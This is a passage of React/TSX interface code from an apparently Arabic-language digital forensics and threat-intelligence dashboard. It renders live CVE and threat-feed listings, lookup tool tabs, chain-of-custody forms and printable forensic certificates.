                    <Sparkles className="w-6 h-6 text-[#D4AF37]" />
                    <div>
                      <h2 className="text-base font-bold text-white">الموجز الاستخباراتي الحي لمركز العمليات (Sovereign SOC Correlation Briefing)</h2>
                      <p className="text-[11px] font-mono text-gray-400">
                        Engine: {liveFeedsBriefing.modelUsed} • {formatTimestampSafe(liveFeedsBriefing.generatedAt)}
                      </p>
                    </div>
                  </div>
                  <span className="px-3 py-1.5 rounded-xl bg-red-500/20 border border-red-500/40 text-red-300 text-xs font-bold self-start">
                    {liveFeedsBriefing.alertCondition}
                  </span>
                </div>

                <p className="text-sm text-gray-200 leading-relaxed whitespace-pre-wrap">{liveFeedsBriefing.executiveBriefing}</p>

                {liveFeedsBriefing.affectedTechnologies?.length > 0 && (
                  <div className="flex flex-wrap gap-2">
                    {liveFeedsBriefing.affectedTechnologies.map((tech, idx) => (
                      <span key={idx} className="px-2.5 py-1 rounded-lg bg-gray-950 border border-gray-800 text-xs font-mono text-[#D4AF37]">
                        {tech}
                      </span>
                    ))}
                  </div>
                )}

                <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                  <div className="bg-gray-950 p-4 rounded-xl border border-gray-800 space-y-2">
                    <div className="text-xs font-bold text-red-400">أولويات الاستجابة الفورية</div>
                    <ul className="space-y-1.5">
                      {liveFeedsBriefing.topPriorityThreats.map((t, i) => (
                        <li key={i} className="text-xs text-gray-300 bg-gray-900 p-2.5 rounded-lg border border-gray-800">
                          {t}
                        </li>
                      ))}
                    </ul>
                  </div>
                  <div className="bg-gray-950 p-4 rounded-xl border border-gray-800 space-y-2">
                    <div className="text-xs font-bold text-emerald-400">خطة التحصين والاحتواء (Actionable Playbook)</div>
                    <ul className="space-y-1.5">
                      {liveFeedsBriefing.actionablePlaybook.map((p, i) => (
                        <li key={i} className="text-xs text-gray-300 bg-gray-900 p-2.5 rounded-lg border border-gray-800 flex items-start gap-2">
                          <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400 mt-0.5 shrink-0" />
                          <span>{p}</span>
                        </li>
                      ))}
                    </ul>
                  </div>
                </div>
              </div>
            )}

            {/* Feed Sources Management + Custom RSS/API Adder */}
            <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-5">
              <div className="flex flex-col md:flex-row md:items-center justify-between gap-3 pb-3 border-b border-gray-800">
                <h3 className="text-sm font-bold text-white flex items-center gap-2">
                  <Server className="w-4 h-4 text-[#D4AF37]" />
                  مصادر التغذيات المفتوحة المتصلة (Open Threat Intelligence Feeds)
                </h3>
                <form onSubmit={addCustomLiveFeedSource} className="flex flex-wrap items-center gap-2">
                  <input
                    type="text"
                    value={newCustomFeedName}
                    onChange={(e) => setNewCustomFeedName(e.target.value)}
                    placeholder="اسم المصدر (اختياري)"
                    className="px-3 py-1.5 bg-gray-950 border border-gray-800 rounded-lg text-xs text-white focus:outline-none focus:border-[#D4AF37] w-36"
                  />
                  <input
                    type="url"
                    value={newCustomFeedUrl}
                    onChange={(e) => setNewCustomFeedUrl(e.target.value)}
                    placeholder="أضف رابط RSS أو JSON API مخصص (https://...)"
                    dir="ltr"
                    required
                    className="px-3 py-1.5 bg-gray-950 border border-gray-800 rounded-lg text-xs font-mono text-white focus:outline-none focus:border-[#D4AF37] w-64"
                  />
                  <button
                    type="submit"
                    className="px-3 py-1.5 bg-[#D4AF37] text-gray-950 font-bold text-xs rounded-lg hover:bg-[#c29f30] transition flex items-center gap-1"
                  >
                    <Plus className="w-3.5 h-3.5" />
                    إضافة مصدر
                  </button>
                </form>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                {liveFeedsCatalog.map((src) => {
                  const enabled = enabledLiveFeeds.includes(src.id);
                  const statusObj = liveFeedsResult?.sourceStatuses.find((s) => s.id === src.id);
                  return (
                    <div
                      key={src.id}
                      className={`p-4 rounded-xl border transition space-y-2 ${
                        enabled ? 'bg-gray-950 border-gray-800' : 'bg-gray-950/40 border-gray-800/50 opacity-60'
                      }`}
                    >
                      <div className="flex items-start justify-between gap-2">
                        <div className="min-w-0">
                          <div className="text-xs font-bold text-white truncate">{src.name}</div>
                          <div className="text-[10px] font-mono text-[#D4AF37]">
                            {src.provider} • {src.format.toUpperCase()} • {src.category}
                          </div>
                        </div>
                        <button
                          onClick={() => toggleLiveFeedSubscription(src.id)}
                          className={`px-2.5 py-1 rounded text-[10px] font-bold shrink-0 ${
                            enabled ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/30' : 'bg-gray-800 text-gray-400'
                          }`}
                        >
                          {enabled ? 'نشط' : 'معطل'}
                        </button>
                      </div>
                      <p className="text-[11px] text-gray-400 line-clamp-2">{src.description}</p>
                      {statusObj && (
                        <div className="flex items-center justify-between text-[10px] font-mono pt-1 border-t border-gray-800">
                          <span className={statusObj.status === 'ok' ? 'text-emerald-400' : 'text-red-400'}>
                            {statusObj.status === 'ok' ? `OK (${statusObj.itemCount} items)` : statusObj.error || 'Error'}
                          </span>
                          <span className="text-gray-500">{statusObj.latencyMs}ms</span>
                        </div>
                      )}
                    </div>
                  );
                })}

                {customLiveFeeds.map((custom, idx) => (
                  <div key={idx} className="p-4 rounded-xl border border-[#D4AF37]/30 bg-gray-950 space-y-2">
                    <div className="flex items-start justify-between gap-2">
                      <div className="min-w-0">
                        <div className="text-xs font-bold text-white truncate">{custom.name}</div>
                        <div className="text-[10px] font-mono text-[#D4AF37] truncate" dir="ltr">
                          {custom.url}
                        </div>
                      </div>
                      <button
                        onClick={() => removeCustomLiveFeedSource(custom.url)}
                        className="p-1 text-red-400 hover:text-red-300"
                        title="إزالة المصدر المخصص"
                      >
                        <Trash2 className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Live Feed Stream & Filtering */}
            <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-5">
              <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-3 pb-4 border-b border-gray-800">
                <div className="flex flex-wrap gap-2">
                  {['ALL', 'CVE / Vulnerability', 'Botnet C2 IP', 'Security Advisory', 'Threat Intel RSS'].map((cat) => (
                    <button
                      key={cat}
                      onClick={() => setLiveFeedsCategoryFilter(cat)}
                      className={`px-3 py-1.5 rounded-xl text-xs font-bold transition ${
                        liveFeedsCategoryFilter === cat
                          ? 'bg-[#D4AF37] text-gray-950'
                          : 'bg-gray-950 text-gray-300 border border-gray-800'
                      }`}
                    >
                      {cat === 'ALL' ? 'الكل' : cat}
                    </button>
                  ))}
                </div>
                <div className="flex flex-wrap items-center gap-2">
                  <select
                    value={liveFeedsSeverityFilter}
                    onChange={(e) => setLiveFeedsSeverityFilter(e.target.value)}
                    className="px-3 py-1.5 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white focus:outline-none focus:border-[#D4AF37]"
                  >
                    <option value="ALL">كل درجات الخطورة</option>
                    <option value="critical">حرج فقط (Critical)</option>
                    <option value="high">مرتفع (High)</option>
                    <option value="medium">متوسط (Medium)</option>
                  </select>
                  <input
                    type="text"
                    value={liveFeedsSearchQuery}
                    onChange={(e) => setLiveFeedsSearchQuery(e.target.value)}
                    placeholder="بحث بـ CVE أو IP أو اسم المنتج..."
                    className="px-3 py-1.5 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white focus:outline-none focus:border-[#D4AF37] w-56"
                  />
                </div>
              </div>

              {!liveFeedsResult ? (
                <div className="p-10 text-center text-sm text-gray-400">
                  جاري جلب بيانات التهديدات الحية من المصادر المفتوحة...
                </div>
              ) : (
                <div className="space-y-3">
                  {liveFeedsResult.items
                    .filter((item) => liveFeedsCategoryFilter === 'ALL' || item.category === liveFeedsCategoryFilter)
                    .filter((item) => liveFeedsSeverityFilter === 'ALL' || item.severity === liveFeedsSeverityFilter)
                    .filter((item) => {
                      const q = liveFeedsSearchQuery.trim().toLowerCase();
                      if (!q) return true;
                      return (
                        item.title.toLowerCase().includes(q) ||
                        item.indicator.toLowerCase().includes(q) ||
                        item.summary.toLowerCase().includes(q) ||
                        item.sourceName.toLowerCase().includes(q)
                      );
                    })
                    .map((item) => (
                      <div
                        key={item.id}
                        className={`p-4 rounded-xl bg-gray-950 border transition space-y-2.5 ${
                          item.severity === 'critical'
                            ? 'border-red-500/35'
                            : item.severity === 'high'
                            ? 'border-amber-500/25'
                            : 'border-gray-800'
                        }`}
                      >
                        <div className="flex flex-col md:flex-row md:items-center justify-between gap-2">
                          <div className="flex flex-wrap items-center gap-2">
                            <span
                              className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                                item.severity === 'critical'
                                  ? 'bg-red-500/20 text-red-300 border border-red-500/40'
                                  : item.severity === 'high'
                                  ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40'
                                  : 'bg-gray-800 text-gray-300'
                              }`}
                            >
                              {item.severityAr}
                              {item.cvssScore ? ` • CVSS ${item.cvssScore}` : ''}
                            </span>
                            <span className="px-2 py-0.5 rounded bg-gray-900 border border-gray-800 text-[10px] font-mono text-[#D4AF37]" dir="ltr">
                              {item.indicator}
                            </span>
                            <span className="text-[11px] text-gray-400">{item.sourceName}</span>
                          </div>
                          <span className="text-[10px] font-mono text-gray-500">{formatTimestampSafe(item.publishedAt)}</span>
                        </div>

                        <h4 className="text-sm font-bold text-white">{item.title}</h4>
                        <p className="text-xs text-gray-300 leading-relaxed">{item.summary}</p>

                        <div className="flex flex-wrap items-center justify-between gap-2 pt-2 border-t border-gray-800/80">
                          <div className="flex flex-wrap gap-1.5">
                            {item.tags.slice(0, 4).map((tag, i) => (
                              <span key={i} className="px-2 py-0.5 rounded bg-gray-900 border border-gray-800 text-[10px] text-gray-400">
                                {tag}
                              </span>
                            ))}
                          </div>
                          <div className="flex flex-wrap items-center gap-2">
                            {item.indicatorKind === 'ip' && (
                              <button
                                onClick={() => {
                                  setActiveTab('threat_intel');
                                  void runThreatIntelLookup(item.indicator);
                                }}
                                className="px-2.5 py-1 rounded-lg bg-[#D4AF37]/15 hover:bg-[#D4AF37]/25 border border-[#D4AF37]/40 text-[#D4AF37] text-[10px] font-bold"
                              >
                                فحص IP في OSINT
                              </button>
                            )}
                            <button
                              onClick={() => void escalateLiveFeedItemToDashboard(item, false)}
                              className="px-2.5 py-1 rounded-lg bg-red-500/15 hover:bg-red-500/25 border border-red-500/30 text-red-300 text-[10px] font-bold"
                            >
                              تصعيد للتهديدات والسجل
                            </button>
                            {item.link && (
                              <a
                                href={sanitizeSafeHref(item.link)}
                                target="_blank"
                                rel="noopener noreferrer"
                                className="px-2.5 py-1 rounded-lg bg-gray-900 hover:bg-gray-800 border border-gray-700 text-gray-300 text-[10px] font-bold inline-flex items-center gap-1"
                              >
                                المصدر
                                <ExternalLink className="w-3 h-3" />
                              </a>
                            )}
                          </div>
                        </div>
                      </div>
                    ))}
                </div>
              )}
            </div>
          </div>
        )}

        {isTabVisible('breach_lookup') && (
          <BreachLookupLab
            onNotify={notifyStatus}
            onRecordAudit={(p) =>
              void saveAuditLog({
                id: p.id,
                timestamp: new Date().toISOString(),
                fileName: p.fileName,
                fileSize: p.fileSize,
                verdict: p.verdict,
                score: p.score,
                risk: p.risk,
                type: 'clipboard',
                sha256: p.sha256,
              })
            }
          />
        )}

        {isTabVisible('archive_extractor') && (
          <ArchiveExtractorLab
            onNotify={notifyStatus}
            onRecordAudit={(p) =>
              void saveAuditLog({
                id: p.id,
                timestamp: new Date().toISOString(),
                fileName: p.fileName,
                fileSize: p.fileSize,
                verdict: p.verdict,
                score: p.score,
                risk: p.risk,
                type: 'clipboard',
                sha256: p.sha256,
              })
            }
          />
        )}

        {isTabVisible('ssl_inspector') && (
          <SslInspectorLab
            onNotify={notifyStatus}
            onRecordAudit={(p) =>
              void saveAuditLog({
                id: p.id,
                timestamp: new Date().toISOString(),
                fileName: p.fileName,
                fileSize: p.fileSize,
                verdict: p.verdict,
                score: p.score,
                risk: p.risk,
                type: 'clipboard',
                sha256: p.sha256,
              })
            }
          />
        )}

        {isTabVisible('ip_mapper') && (
          <IpGeoThreatMapperLab
            onNotify={notifyStatus}
            onRecordAudit={(p) =>
              void saveAuditLog({
                id: p.id,
                timestamp: new Date().toISOString(),
                fileName: p.fileName,
                fileSize: p.fileSize,
                verdict: p.verdict,
                score: p.score,
                risk: p.risk,
                type: 'clipboard',
                sha256: p.sha256,
              })
            }
          />
        )}

        {isTabVisible('malware_hash') && (
          <MalwareHashLookupLab
            onNotify={notifyStatus}
            onRecordAudit={(p) =>
              void saveAuditLog({
                id: p.id,
                timestamp: new Date().toISOString(),
                fileName: p.fileName,
                fileSize: p.fileSize,
                verdict: p.verdict,
                score: p.score,
                risk: p.risk,
                type: 'clipboard',
                sha256: p.sha256,
              })
            }
          />
        )}

        {isTabVisible('pdf_forensics') && (
          <PdfDocumentForensicsLab
            onNotify={notifyStatus}
            onRecordAudit={(p) =>
              void saveAuditLog({
                id: p.id,
                timestamp: new Date().toISOString(),
                fileName: p.fileName,
                fileSize: p.fileSize,
                verdict: p.verdict,
                score: p.score,
                risk: p.risk,
                type: 'clipboard',
                sha256: p.sha256,
              })
            }
          />
        )}

        {isTabVisible('url_tracer') && (
          <UrlRedirectTracerLab
            onNotify={notifyStatus}
            onRecordAudit={(p) =>
              void saveAuditLog({
                id: p.id,
                timestamp: new Date().toISOString(),
                fileName: p.fileName,
                fileSize: p.fileSize,
                verdict: p.verdict,
                score: p.score,
                risk: p.risk,
                type: 'clipboard',
                sha256: p.sha256,
              })
            }
          />
        )}

        {isTabVisible('steg_inspector') && (
          <StegLsbInspectorLab
            onNotify={notifyStatus}
            onRecordAudit={(p) =>
              void saveAuditLog({
                id: p.id,
                timestamp: new Date().toISOString(),
                fileName: p.fileName,
                fileSize: p.fileSize,
                verdict: p.verdict,
                score: p.score,
                risk: p.risk,
                type: 'clipboard',
                sha256: p.sha256,
              })
            }
          />
        )}

        {isTabVisible('cyber_telemetry') && (
          <CyberTelemetryNetworkDashboard
            auditLogs={auditLogs}
            telemetryLogs={telemetryLogs}
            liveFeedItems={liveFeedsResult?.items || []}
            onNotify={notifyStatus}
            onRecordAudit={(p) =>
              void saveAuditLog({
                id: p.id,
                timestamp: new Date().toISOString(),
                fileName: p.fileName,
                fileSize: p.fileSize,
                verdict: p.verdict,
                score: p.score,
                risk: p.risk,
                type: 'clipboard',
                sha256: p.sha256,
              })
            }
          />
        )}

        {isTabVisible('vuln_kev_dashboard') && (
          <VulnMgmtKevDashboard
            liveFeedItems={liveFeedsResult?.items || []}
            onNotify={notifyStatus}
            onRecordAudit={(p) =>
              void saveAuditLog({
                id: p.id,
                timestamp: new Date().toISOString(),
                fileName: p.fileName,
                fileSize: p.fileSize,
                verdict: p.verdict,
                score: p.score,
                risk: p.risk,
                type: 'clipboard',
                sha256: p.sha256,
              })
            }
          />
        )}

        {isTabVisible('asset_os_dashboard') && (
          <AssetOsDistributionDashboard
            auditLogs={auditLogs}
            evidenceList={evidenceList}
            onNotify={notifyStatus}
            onRecordAudit={(p) =>
              void saveAuditLog({
                id: p.id,
                timestamp: new Date().toISOString(),
                fileName: p.fileName,
                fileSize: p.fileSize,
                verdict: p.verdict,
                score: p.score,
                risk: p.risk,
                type: 'clipboard',
                sha256: p.sha256,
              })
            }
          />
        )}

        {isTabVisible('samples') && (
          <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-6">
            <h2 className="text-lg font-bold text-white">عينات الفحص الفوري</h2>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
              <button onClick={() => loadSampleImage('authentic')} className="p-5 bg-gray-950 border border-gray-800 rounded-xl text-right hover:border-[#D4AF37] transition space-y-2">
                <h3 className="font-bold text-white">عينة أصلية</h3>
                <p className="text-xs text-gray-400">فحص عينة بمسار بايتات قياسي.</p>
              </button>
              <button onClick={() => loadSampleImage('deepfake')} className="p-5 bg-gray-950 border border-gray-800 rounded-xl text-right hover:border-purple-500 transition space-y-2">
                <h3 className="font-bold text-white">عينة تزييف عميق</h3>
                <p className="text-xs text-gray-400">فحص عينة بتباين منخفض.</p>
              </button>
              <button onClick={() => loadSampleImage('manipulated')} className="p-5 bg-gray-950 border border-gray-800 rounded-xl text-right hover:border-red-500 transition space-y-2">
                <h3 className="font-bold text-white">عينة معدلة</h3>
                <p className="text-xs text-gray-400">فحص مستند مضاف.</p>
              </button>
            </div>
          </div>
        )}
            </div>
          </>
        )}
      </main>
      </div>

      <footer className="border-t border-gray-800 bg-gray-950 py-6 px-6 text-center text-xs text-gray-500">
        <p>© 2026 منصة أمان المستقلة (Real EXIF & ELA Core v2.5). مدعومة بمصادقة Firebase ونظام البحث الموجه والمصادر المفتوحة.</p>
      </footer>

      {/* Official Printable Forensic PDF Certificate Modal */}
      {authReady && user && showPrintModal && analysisResult && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4 overflow-y-auto">
          <div className="bg-white text-gray-950 rounded-2xl max-w-3xl w-full p-8 shadow-2xl space-y-6 relative print-certificate">
            <div className="flex items-center justify-between pb-4 border-b border-gray-300">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-gray-900 text-white rounded-xl flex items-center justify-center font-bold">
                  🛡️
                </div>
                <div>
                  <h2 className="text-xl font-bold tracking-tight">شهادة التوثيق والتحليل الجنائي الرقمي</h2>
                  <p className="text-xs text-gray-500 font-mono">منصة أمان المستقلة - Sovereign Digital Forensics Core</p>
                </div>
              </div>
              <div className="text-left font-mono text-xs text-gray-500">
                <div>التاريخ: {new Date().toLocaleDateString('ar-SA')}</div>
                <div>الحالة: معتمد رسمياً</div>
              </div>
            </div>

            <div className="space-y-4 text-sm">
              <div className="grid grid-cols-2 gap-4 bg-gray-50 p-4 rounded-xl border border-gray-200">
                <div>
                  <span className="text-xs text-gray-500 block">اسم الملف:</span>
                  <span className="font-mono font-bold text-gray-900">{analysisResult.fileName}</span>
                </div>
                <div>
                  <span className="text-xs text-gray-500 block">حجم الملف:</span>
                  <span className="font-mono text-gray-900">{analysisResult.fileSizeFormatted}</span>
                </div>
                <div>
                  <span className="text-xs text-gray-500 block">نوع الملف المكتشف:</span>
                  <span className="font-mono text-gray-900">{analysisResult.detectedFileType}</span>
                </div>
                <div>
                  <span className="text-xs text-gray-500 block">نسبة الأصالة:</span>
                  <span className="font-mono font-bold text-emerald-700">{analysisResult.authenticityScore}%</span>
                </div>
              </div>

              <div className="space-y-2 font-mono text-xs bg-gray-50 p-4 rounded-xl border border-gray-200">
                <div>
                  <span className="text-gray-500 block">SHA-256 Hash:</span>
                  <span className="text-gray-800 break-all">{analysisResult.sha256}</span>
                </div>
                <div className="pt-2 border-t border-gray-200">
                  <span className="text-gray-500 block">SHA-1 Hash:</span>
                  <span className="text-gray-800 break-all">{analysisResult.sha1}</span>
                </div>
              </div>

              <div className="space-y-2">
                <span className="text-xs font-bold text-gray-700 block">النتيجة النهائية والتقرير الفني:</span>
                <div className="p-4 bg-gray-50 rounded-xl border border-gray-200 text-xs text-gray-800 leading-relaxed">
                  {analysisResult.localReport.detailedReport}
                </div>
              </div>

              <div className="space-y-2">
                <span className="text-xs font-bold text-gray-700 block">مؤشرات الفحص العادل:</span>
                <ul className="space-y-1">
                  {analysisResult.localReport.indicators.map((ind, i) => (
                    <li key={i} className="text-xs text-gray-700 flex items-center gap-2 bg-gray-50 px-3 py-2 rounded border border-gray-200">
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-600"></span>
                      {ind}
                    </li>
                  ))}
                </ul>
              </div>
            </div>

            <div className="flex items-center justify-between pt-6 border-t border-gray-300 no-print">
              <button
                onClick={() => setShowPrintModal(false)}
                className="px-5 py-2.5 bg-gray-200 hover:bg-gray-300 text-gray-800 text-xs font-medium rounded-xl transition"
              >
                إغلاق
              </button>
              <button
                onClick={() => window.print()}
                className="px-6 py-2.5 bg-gray-900 hover:bg-black text-white text-xs font-bold rounded-xl transition flex items-center gap-2 shadow-lg"
              >
                <Download className="w-4 h-4" />
                طباعة / حفظ كـ PDF رسمي
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Add Chain of Custody Event Modal */}
      {authReady && user && showAddCustodyModal && (custodyModalScope === 'global' || selectedEvidenceForHistory) && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
          <div className="max-w-lg w-full bg-gray-900 border border-gray-800 rounded-3xl p-6 shadow-2xl space-y-5">
            <div className="flex items-center justify-between pb-3 border-b border-gray-800">
              <div className="flex items-center gap-2">
                <History className="w-5 h-5 text-[#D4AF37]" />
                <h3 className="text-sm font-bold text-white">
                  {custodyModalScope === 'global'
                    ? 'توثيق إجراء محقق جديد في السجل الشامل (SHA-256)'
                    : 'تسجيل حركة جديدة في سلسلة الحيازة'}
                </h3>
              </div>
              <button onClick={() => setShowAddCustodyModal(false)} className="text-gray-400 hover:text-white cursor-pointer">
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="flex flex-wrap gap-1.5">
              {['فحص الترويسة Magic Bytes', 'نقل للتحليل في مختبر الفيروسات', 'تصدير نسخة طبق الأصل', 'أرشفة في الخزنة المشفرة'].map(preset => (
                <button
                  key={preset}
                  type="button"
                  onClick={() => setCustodyForm(prev => ({ ...prev, action: preset }))}
                  className="px-2.5 py-1 bg-gray-950 hover:bg-gray-800 border border-gray-800 rounded-lg text-[10px] text-gray-300 transition"
                >
                  {preset}
                </button>
              ))}
            </div>

            <form
              onSubmit={async (e) => {
                e.preventDefault();
                if (!custodyForm.action.trim() || !custodyForm.location.trim()) return;
                setIsAddingCustody(true);
                try {
                  if (custodyModalScope === 'global') {
                    await recordCustodyLedgerBlock(
                      selectedEvidenceForHistory || `manual-event-${Date.now()}`,
                      'MANUAL_CUSTODY',
                      custodyForm.action.trim(),
                      custodyForm.location.trim(),
                      custodyForm.notes.trim(),
                      custodyForm.officerName.trim()
                    );
                  } else if (selectedEvidenceForHistory) {
                    await addToCustody(
                      selectedEvidenceForHistory,
                      custodyForm.action.trim(),
                      custodyForm.location.trim(),
                      custodyForm.notes.trim(),
                      custodyForm.officerName.trim()
                    );
                  }
                  setShowAddCustodyModal(false);
                  setCustodyForm(prev => ({ ...prev, notes: '' }));
                  notifyStatus('تم توثيق الحركة الجديدة وربطها بالبصمة SHA-256 السابقة.', 'success');
                } finally {
                  setIsAddingCustody(false);
                }
              }}
              className="space-y-4"
            >
              <div className="space-y-1.5">
                <label className="text-xs font-bold text-gray-400">الإجراء الجنائي</label>
                <input
                  type="text"
                  value={custodyForm.action}
                  onChange={(e) => setCustodyForm(prev => ({ ...prev, action: e.target.value }))}
                  className="w-full px-3.5 py-2.5 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white focus:border-[#D4AF37] outline-none"
                  required
                />
              </div>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div className="space-y-1.5">
                  <label className="text-xs font-bold text-gray-400">الموقع / المحطة</label>
                  <input
                    type="text"
                    value={custodyForm.location}
                    onChange={(e) => setCustodyForm(prev => ({ ...prev, location: e.target.value }))}
                    className="w-full px-3.5 py-2.5 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white focus:border-[#D4AF37] outline-none"
                    required
                  />
                </div>
                <div className="space-y-1.5">
                  <label className="text-xs font-bold text-gray-400">المحقق المسؤول</label>
                  <input
                    type="text"
                    value={custodyForm.officerName}
                    onChange={(e) => setCustodyForm(prev => ({ ...prev, officerName: e.target.value }))}
                    placeholder={userProfile?.displayName || 'اسم المحقق'}
                    className="w-full px-3.5 py-2.5 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white focus:border-[#D4AF37] outline-none"
                  />
                </div>
              </div>
              <div className="space-y-1.5">
                <label className="text-xs font-bold text-gray-400">ملاحظات فنية وقانونية</label>
                <textarea
                  rows={3}
                  value={custodyForm.notes}
                  onChange={(e) => setCustodyForm(prev => ({ ...prev, notes: e.target.value }))}
                  placeholder="تفاصيل الحالة أو رقم التقرير..."
                  className="w-full px-3.5 py-2.5 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white focus:border-[#D4AF37] outline-none resize-none"
                />
              </div>
              <div className="flex gap-3 pt-2">
                <button
                  type="button"
                  onClick={() => setShowAddCustodyModal(false)}
                  className="flex-1 py-2.5 bg-gray-800 hover:bg-gray-700 text-gray-200 rounded-xl text-xs font-bold"
                >
                  إلغاء
                </button>
                <button
                  type="submit"
                  disabled={isAddingCustody}
                  className="flex-1 py-2.5 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 rounded-xl text-xs font-bold disabled:opacity-50"
                >
                  {isAddingCustody ? 'جاري التشفير والحفظ...' : 'تشفير وحفظ الكتلة'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Official Chain of Custody Certificate Modal */}
      {authReady && user && showCustodyCertificate && selectedEvidenceForHistory && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4 overflow-y-auto">
          <div className="bg-white text-gray-950 rounded-2xl max-w-4xl w-full p-8 shadow-2xl space-y-6 print-certificate my-8">
            <div className="flex items-center justify-between pb-4 border-b border-gray-300">
              <div>
                <h2 className="text-xl font-bold">شهادة سلسلة الحيازة الرقمية المشفرة (Chain of Custody Certificate)</h2>
                <p className="text-xs text-gray-500 font-mono">SHA-256 Cryptographic Ledger • {custodyVerification.verified ? 'INTEGRITY VERIFIED' : 'INTEGRITY WARNING'}</p>
              </div>
              <button onClick={() => setShowCustodyCertificate(false)} className="text-gray-500 hover:text-black no-print">
                <X className="w-5 h-5" />
              </button>
            </div>

            {(() => {
              const ev = evidenceList.find(e => e.id === selectedEvidenceForHistory);
              return (
                <div className="grid grid-cols-1 md:grid-cols-2 gap-3 bg-gray-50 p-4 rounded-xl border border-gray-200 text-xs">
                  <div><span className="text-gray-500">معرف الدليل:</span> <span className="font-mono font-bold">{selectedEvidenceForHistory}</span></div>
                  <div><span className="text-gray-500">اسم الملف:</span> <span className="font-mono font-bold">{ev?.fileName || 'دليل رقمي'}</span></div>
                  <div className="md:col-span-2"><span className="text-gray-500">SHA-256 الأصلي:</span> <span className="font-mono break-all">{ev?.sha256 || 'N/A'}</span></div>
                </div>
              );
            })()}

            <div className="overflow-x-auto">
              <table className="w-full text-right text-xs border border-gray-200 rounded-xl overflow-hidden">
                <thead className="bg-gray-100 text-gray-700">
                  <tr>
                    <th className="p-2.5">الوقت</th>
                    <th className="p-2.5">الإجراء</th>
                    <th className="p-2.5">المسؤول والموقع</th>
                    <th className="p-2.5">بصمة الكتلة (RecordHash)</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-200">
                  {[...custodyHistory].reverse().map((entry) => (
                    <tr key={entry.id}>
                      <td className="p-2.5 font-mono text-[10px]">{new Date(entry.timestamp).toLocaleString('ar-SA')}</td>
                      <td className="p-2.5 font-bold">{entry.action}</td>
                      <td className="p-2.5">{entry.officerName} — {entry.location}</td>
                      <td className="p-2.5 font-mono text-[10px] break-all max-w-[200px]">{entry.recordHash}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

            <div className="flex items-center justify-between pt-4 border-t border-gray-300 no-print">
              <button onClick={() => setShowCustodyCertificate(false)} className="px-5 py-2.5 bg-gray-200 hover:bg-gray-300 text-gray-800 text-xs font-medium rounded-xl">
                إغلاق
              </button>
              <button onClick={() => window.print()} className="px-6 py-2.5 bg-gray-900 hover:bg-black text-white text-xs font-bold rounded-xl flex items-center gap-2">
                <Download className="w-4 h-4" />
                طباعة / حفظ كـ PDF
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Create New Investigation Modal */}
      {authReady && user && showNewInvModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
          <div className="max-w-md w-full bg-gray-900 border border-gray-800 rounded-3xl p-6 shadow-2xl space-y-5">
            <div className="flex items-center justify-between pb-3 border-b border-gray-800">
              <h3 className="text-sm font-bold text-white flex items-center gap-2">
                <Briefcase className="w-4 h-4 text-[#D4AF37]" />
                إنشاء ملف تحقيق جنائي جديد
              </h3>
              <button onClick={() => setShowNewInvModal(false)} className="text-gray-400 hover:text-white">
                <X className="w-4 h-4" />
              </button>
            </div>
            <form
              onSubmit={async (e) => {
                e.preventDefault();
                if (!newInvTitle.trim()) return;
                await createNewInvestigation(newInvTitle.trim());
                setShowNewInvModal(false);
                setNewInvTitle('');
              }}
              className="space-y-4"
            >
              <input
                type="text"
                value={newInvTitle}
                onChange={(e) => setNewInvTitle(e.target.value)}
                placeholder="مثال: تحقيق حادثة اختراق الخادم #2026-04"
                className="w-full px-4 py-3 bg-gray-950 border border-gray-800 rounded-xl text-sm text-white focus:border-[#D4AF37] outline-none"
                autoFocus
                required
              />
              <div className="flex gap-3">
                <button type="button" onClick={() => setShowNewInvModal(false)} className="flex-1 py-2.5 bg-gray-800 hover:bg-gray-700 text-gray-200 rounded-xl text-xs font-bold">
                  إلغاء
                </button>
                <button type="submit" className="flex-1 py-2.5 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 rounded-xl text-xs font-bold">
                  إنشاء وحفظ
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Update Details Modal */}
      {authReady && user && (
        <UpdateModal
          isOpen={update.showModal}
          onClose={() => update.setShowModal(false)}
          updateDetails={update.updateDetails}
          isUpdating={update.isUpdating}
          applyUpdateNow={update.applyUpdateNow}
        />
      )}

      {/* Floating System & Forensic Status Toast */}
      {(statusToast || (authReady && user && update.toastMessage)) && (
        <div className={`fixed bottom-14 left-1/2 -translate-x-1/2 z-50 max-w-[92vw] bg-gray-900/95 border text-white text-xs px-4 py-2.5 rounded-xl shadow-2xl flex items-center gap-2 animate-in fade-in slide-in-from-bottom-2 backdrop-blur-md ${
          statusToast?.type === 'error'
